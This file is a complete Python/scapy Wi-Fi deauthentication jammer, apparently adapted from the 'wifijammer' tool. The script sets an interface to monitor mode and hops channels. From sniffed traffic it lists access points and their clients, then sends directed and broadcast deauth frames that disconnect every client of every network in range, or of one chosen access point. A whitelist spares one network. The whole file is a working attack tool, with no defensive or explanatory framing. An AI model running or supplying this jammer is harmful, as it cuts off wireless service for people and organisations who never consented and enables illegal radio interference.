#!/usr/bin/env python3
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0

import os
import sys
import time
from threading import Thread, Lock
from subprocess import Popen, PIPE, DEVNULL
from signal import SIGINT, signal
import argparse
import socket
import struct
import fcntl
import re

WHITELISTED_AP = [
    "11:22:33:44:55:66",   # BSSID
    "yourssidhere"        # SSID (en minuscule pour normaliser)
]

# Console colors
W='\033[0m'; R='\033[31m'; G='\033[32m'; O='\033[33m'; B='\033[34m'; P='\033[35m'; C='\033[36m'; GR='\033[37m'; T='\033[93m'

def parse_args():
    parser=argparse.ArgumentParser()
    parser.add_argument('-s','--skip')
    parser.add_argument('-i','--interface',help='Choose monitor mode interface manually.')
    parser.add_argument('-c','--channel')
    parser.add_argument('-m','--maximum')
    parser.add_argument('-n','--noupdate',action='store_true')
    parser.add_argument('-t','--timeinterval')
    parser.add_argument('-p','--packets')
    parser.add_argument('-d','--directedonly',action='store_true')
    parser.add_argument('-a','--accesspoint', help='Target AP BSSID (required when --target one).')
    parser.add_argument('--target', choices=['all', 'one'], default='all',
                        help='Choose whether to deauth all APs or only one target AP.')
    parser.add_argument('--scan-time', type=int, default=12,
                        help='Seconds to scan for APs before interactive target selection.')
    parser.add_argument('--world',action='store_true')
    args = parser.parse_args()

    if args.accesspoint:
        args.accesspoint = args.accesspoint.lower()

    return args

########################################
# INTERFACE MANAGEMENT
########################################

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DEVNULL)
    except OSError:
        sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
    out = proc.communicate()[0].decode(errors='ignore')
    for line in out.split('\n'):
        if len(line) == 0:
            continue
        if line[0] != ' ':
            wired_search = re.search(r'eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:
                # interface name up to first space
                iface = line.split()[0]
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    # detect if associated (ESSID present)
                    interfaces[iface] = 1 if "ESSID:\"" in line else 0
    return monitors, interfaces

def start_mon_mode(interface):
    print('['+G+'+'+W+'] Starting monitor mode on '+G+interface+W)
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Could not start monitor mode')

def remove_mon_iface(mon_iface):
    try:
        os.system('ifconfig %s down' % mon_iface)
        os.system('iwconfig %s mode managed' % mon_iface)
        os.system('ifconfig %s up' % mon_iface)
    except Exception:
        pass

def mon_mac(mon_iface):
    '''
    get MAC address of the interface
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # pack expects bytes in py3
    iface_bytes = mon_iface[:15].encode('utf-8')
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface_bytes))
    mac = ''.join(['%02x:' % b for b in info[18:24]])[:-1]
    print('['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W)
    return mac

def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()

    # User explicitly provided interface
    if args.interface:
        print(f"[{G}*{W}] Using user-selected interface: {args.interface}")
        monitor_on = True
        return args.interface

    # If monitor interface already exists
    if monitors:
        monitor_on=True
        return monitors[0]

    # Otherwise ask user to pick from available wireless interfaces
    if interfaces:
        print(f"[{G}?{W}] Select an interface to enable monitor mode:\n")
        for idx, iface in enumerate(interfaces.keys(), start=1):
            print(f"  {idx}. {iface}")

        while True:
            try:
                choice=int(input(f"\n[{G}?{W}] Enter number: "))
                if 1 <= choice <= len(interfaces):
                    interface=list(interfaces.keys())[choice-1]
                    break
            except ValueError:
                pass
            print(f"[{R}!{W}] Invalid selection. Try again.")

        print(f"[{G}+{W}] Starting monitor mode on {G}{interface}{W}")
        monmode=start_mon_mode(interface)
        return monmode
    else:
        sys.exit(f"[{R}-{W}] No wireless interfaces found.")

def parse_ap_from_packet(pkt, world_arg):
    '''
    Extract AP info from beacon/probe response packet.
    Returns (bssid, channel, ssid) or None.
    '''
    if not (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
        return None
    if not pkt.haslayer(Dot11Elt):
        return None

    try:
        bssid = pkt[Dot11].addr3.lower()
        ssid = pkt[Dot11Elt].info
        if isinstance(ssid, bytes):
            ssid = ssid.decode('utf-8', errors='ignore')
        ap_channel = str(pkt[Dot11Elt:3].info[0])
        valid_channels = [str(i) for i in range(1, 14)] if world_arg else [str(i) for i in range(1, 12)]
        if ap_channel not in valid_channels:
            return None

        ssid_lower = ssid.lower()
        if bssid in WHITELISTED_AP or ssid_lower in WHITELISTED_AP:
            return None

        return (bssid, ap_channel, ssid)
    except Exception:
        return None

def choose_target_ap(mon_iface, args):
    '''
    Scan APs for a short period and let the user choose one by index.
    '''
    print(f"[{G}?{W}] Target mode is 'one' and no --accesspoint was provided.")
    print(f"[{G}*{W}] Scanning for APs during {args.scan_time}s...\n")

    discovered = {}
    max_chan = 13 if args.world else 11
    end_time = time.time() + max(3, args.scan_time)
    chan = 1

    while time.time() < end_time:
        os.system(f'iw dev {mon_iface} set channel {chan} >/dev/null 2>&1')
        pkts = sniff(iface=mon_iface, timeout=0.8, store=1)
        for pkt in pkts:
            ap_info = parse_ap_from_packet(pkt, args.world)
            if ap_info:
                bssid, ap_channel, ssid = ap_info
                if bssid not in discovered:
                    discovered[bssid] = (ap_channel, ssid)
        chan += 1
        if chan > max_chan:
            chan = 1

    if not discovered:
        sys.exit(f"[{R}-{W}] No AP found during scan. Increase --scan-time and retry.")

    ap_items = sorted(discovered.items(), key=lambda x: (int(x[1][0]), x[0]))
    print(f"[{G}?{W}] Choose target AP:\n")
    for idx, (bssid, (channel, ssid)) in enumerate(ap_items, start=1):
        display_ssid = ssid if ssid else '<hidden>'
        print(f"  {idx}. {bssid}  ch:{channel}  ssid:{display_ssid}")

    while True:
        try:
            choice = int(input(f"\n[{G}?{W}] Enter number: "))
            if 1 <= choice <= len(ap_items):
                selected_bssid, (selected_channel, _) = ap_items[choice - 1]
                print(f"[{G}+{W}] Selected AP: {G}{selected_bssid}{W} on channel {G}{selected_channel}{W}\n")
                return selected_bssid, selected_channel
        except ValueError:
            pass
        print(f"[{R}!{W}] Invalid selection. Try again.")

########################################
# End of interface info and manipulation
########################################


def channel_hop(mon_iface, args):
    '''
    First pass stays longer to populate lists, after that goes fast.
    '''
    global monchannel, first_pass

    channelNum = 0
    maxChan = 11 if not args.world else 13
    err = None

    while True:
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum += 1
            if channelNum > maxChan:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)

            try:
                proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DEVNULL, stderr=PIPE)
            except OSError:
                print('['+R+'-'+W+'] Could not execute "iw"')
                os.kill(os.getpid(),SIGINT)
                sys.exit(1)
            for line in proc.communicate()[1].decode(errors='ignore').split('\n'):
                if len(line) > 2: # iw dev prints only on error
                    err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W

        output(err, monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            # For the first channel hop thru, do not deauth
            if first_pass == 1:
                time.sleep(1)
                continue

        deauth(monchannel)


def deauth(monchannel):
    '''
    Build Dot11 Deauth frames and send them with sendp() over the monitor interface.
    '''
    pkts = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                if ch == monchannel:
                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0:
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == monchannel:
                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        # prevent 'no buffer space' scapy error
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.packets:
            args.packets = 1

        for p in pkts:
            # Must use sendp for Layer 2 frames; add RadioTap header
            sendp(RadioTap()/p, iface=mon_iface, inter=float(args.timeinterval), count=int(args.packets), verbose=0)


def output(err, monchannel):
    os.system('clear')
    if err:
        print(err)
    else:
        print('['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\n')
    if len(clients_APs) > 0:
        print('                  Deauthing                 ch   ESSID')
    # Print the deauth list
    with lock:
        for ca in clients_APs:
            if len(ca) > 3:
                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W)
            else:
                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2])
    if len(APs) > 0:
        print('\n      Access Points     ch   ESSID')
    with lock:
        for ap in APs:
            print('['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W)
    print('')

def noise_filter(skip, addr1, addr2):
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True
    return False

def cb(pkt):
    '''
    Packet callback for sniff()
    '''
    global clients_APs, APs

    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            pkt.addr1 = pkt.addr1.lower()
            pkt.addr2 = pkt.addr2.lower()

            if args.target == 'one' and args.accesspoint:
                target = args.accesspoint.lower()
                addr3 = pkt.addr3.lower() if pkt.addr3 else ''
                if target not in [pkt.addr1, pkt.addr2, addr3]:
                    return

            if args.skip:
                if args.skip.lower() == pkt.addr2:
                    return

            # If beacon or probe response, add to AP list
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel, args.world)

            # Ignore noisy packets
            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                return

            # Management = 1, data = 2
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)

def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
    ap_info = parse_ap_from_packet(pkt, world_arg)
    if not ap_info:
        return  # On ne surveille pas ce point d'accès
    bssid, ap_channel, ssid = ap_info
    if chan_arg and ap_channel != chan_arg:
        return

    with lock:
        for b in APs:
            if bssid in b[0]:
                return
        APs.append([bssid, ap_channel, ssid])

    # In single-target mode, pin to the target AP channel as soon as we know it.
    if args.target == 'one' and args.accesspoint and bssid == args.accesspoint and not args.channel:
        args.channel = ap_channel

def clients_APs_add(clients_APs, addr1, addr2):
    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)
            return

    # Append new clients/APs if they're not in the list
    for ca in clients_APs:
        if addr1 in ca and addr2 in ca:
            return

    if len(APs) > 0:
        return AP_check(addr1, addr2)
    else:
        with lock:
            return clients_APs.append([addr1, addr2, monchannel])

def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])

def stop(signalnum, frame):
    if monitor_on:
        sys.exit('\n['+R+'!'+W+'] Closing')
    else:
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')
        sys.exit('\n['+R+'!'+W+'] Closing')


if __name__ == "__main__":
    if os.geteuid():
        sys.exit('['+R+'-'+W+'] Please run as root')

    clients_APs = []
    APs = []
    lock = Lock()
    args = parse_args()
    monitor_on = None

    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    if args.target == 'one' and not args.accesspoint:
        args.accesspoint, selected_channel = choose_target_ap(mon_iface, args)
        if not args.channel:
            args.channel = selected_channel

    # Start channel hopping thread
    hop = Thread(target=channel_hop, args=(mon_iface, args))
    hop.daemon = True
    hop.start()

    signal(SIGINT, stop)

    try:
       sniff(iface=mon_iface, store=0, prn=cb)
    except Exception as msg:
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')
        print('\n['+R+'!'+W+'] Closing:', msg)
        sys.exit(0)
